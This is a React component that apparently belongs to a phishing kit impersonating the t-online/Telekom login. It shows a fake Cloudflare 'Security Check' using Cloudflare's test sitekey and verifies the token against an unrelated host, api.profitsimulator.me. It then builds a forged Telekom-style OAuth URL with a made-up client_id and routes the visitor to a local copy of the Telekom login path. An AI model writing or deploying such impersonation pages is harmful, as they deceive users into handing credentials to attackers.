import { useEffect, useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";

declare global {
  interface Window {
    turnstile: {
      render: (element: string | HTMLElement, options: any) => string;
      reset: (widgetId?: string) => void;
      remove: (widgetId?: string) => void;
    };
  }
}

const SecurityCheck = () => {
  const navigate = useNavigate();
  const [isVerifying, setIsVerifying] = useState(false);
  const [isComplete, setIsComplete] = useState(false);
  const [error, setError] = useState<string>("");
  const turnstileRef = useRef<HTMLDivElement>(null);
  const widgetId = useRef<string>("");

  // Generate random OAuth2 parameters
  const generateRandomString = (length: number) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const generateClientId = () => {
    const prefix = '10LIVESAM';
    const suffix = 'PORTALE';
    const middle = Math.random().toString().slice(2, 15);
    const end = '0'.repeat(15);
    return `${prefix}${middle}${suffix}${end}`;
  };

  // Load Turnstile script and initialize
  useEffect(() => {
    const loadTurnstile = () => {
      if (document.querySelector('script[src*="turnstile"]')) {
        initializeTurnstile();
        return;
      }

      const script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js';
      script.async = true;
      script.defer = true;
      script.onload = initializeTurnstile;
      document.head.appendChild(script);
    };

    const initializeTurnstile = () => {
      if (window.turnstile && turnstileRef.current) {
        try {
          widgetId.current = window.turnstile.render(turnstileRef.current, {
            sitekey: '1x00000000000000000000AA',
            callback: handleTurnstileSuccess,
            'error-callback': handleTurnstileError,
            theme: 'light',
            size: 'normal',
          });
        } catch (error) {
          console.error('Turnstile initialization failed:', error);
          setError('Failed to initialize security check');
        }
      }
    };

    loadTurnstile();

    return () => {
      if (window.turnstile && widgetId.current) {
        try {
          window.turnstile.remove(widgetId.current);
        } catch (error) {
          console.error('Turnstile cleanup failed:', error);
        }
      }
    };
  }, []);

  const handleTurnstileSuccess = async (token: string) => {
    setIsVerifying(true);
    setError("");

    try {
      const response = await fetch('https://api.profitsimulator.me/TONLINE/verify-turnstile.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          token: token,
          sitekey: '1x00000000000000000000AA'
        }),
      });

      const result = await response.json();

      if (result.success) {
        setIsComplete(true);
        
        // Navigate to login after showing success
        setTimeout(() => {
          const clientId = generateClientId();
          const state = generateRandomString(43);
          const nonce = generateRandomString(43);
          const claims = encodeURIComponent('{"id_token":{"urn:telekom.com:all":null}}');
          const redirectUri = encodeURIComponent('https://www.t-online.de/auth/login/oauth2/code/telekom');
          
          const oauthUrl = `/oauth2/auth/io?response_type=code&client_id=${clientId}&scope=openid&claims=${claims}&state=${state}&redirect_uri=${redirectUri}&nonce=${nonce}`;
          navigate(oauthUrl);
        }, 1500);
      } else {
        setError('Verification failed. Please try again.');
        setIsVerifying(false);
        // Reset turnstile
        if (window.turnstile && widgetId.current) {
          window.turnstile.reset(widgetId.current);
        }
      }
    } catch (error) {
      console.error('Verification error:', error);
      setError('Network error. Please try again.');
      setIsVerifying(false);
      // Reset turnstile
      if (window.turnstile && widgetId.current) {
        window.turnstile.reset(widgetId.current);
      }
    }
  };

  const handleTurnstileError = () => {
    setError('Security check failed. Please refresh the page.');
    setIsVerifying(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center" 
         style={{ background: 'var(--gradient-bg)' }}>
      <div className="w-full max-w-md px-4">
        <Card className="p-8 text-center border-0" 
              style={{ 
                background: 'var(--gradient-card)',
                boxShadow: 'var(--shadow-card)',
                backdropFilter: 'blur(10px)'
              }}>
          <h1 className="text-2xl font-semibold mb-4 text-gray-800">
            Security Check
          </h1>
          <p className="text-gray-600 mb-8">
            Please complete the security verification to continue
          </p>
          
          {/* Turnstile Widget Container */}
          <div className="mb-6 flex justify-center">
            <div ref={turnstileRef}></div>
          </div>

          {/* Status Display */}
          {(isVerifying || isComplete) && (
            <div className="bg-gray-800 rounded-lg p-4 mb-6">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2">
                  {isComplete ? (
                    <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                      <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                      </svg>
                    </div>
                  ) : (
                    <div className={`w-6 h-6 border-2 border-green-500 rounded-full ${isVerifying ? 'animate-spin border-t-transparent' : ''}`} />
                  )}
                  <span className="text-white text-sm font-medium">
                    {isComplete ? 'Erfolg!' : isVerifying ? 'Verifying...' : 'Checking...'}
                  </span>
                </div>
                <div className="text-right">
                  <div className="text-xs text-gray-400 uppercase tracking-wider">Cloudflare</div>
                  <div className="text-xs text-gray-400">Privatsphäre</div>
                  <div className="text-xs text-gray-400">Nutzungsbedingungen</div>
                </div>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded mb-4">
              {error}
            </div>
          )}
          
          {isComplete && (
            <div className="text-green-600 text-sm">
              Verification complete! Redirecting...
            </div>
          )}
        </Card>
      </div>
    </div>
  );
};

export default SecurityCheck;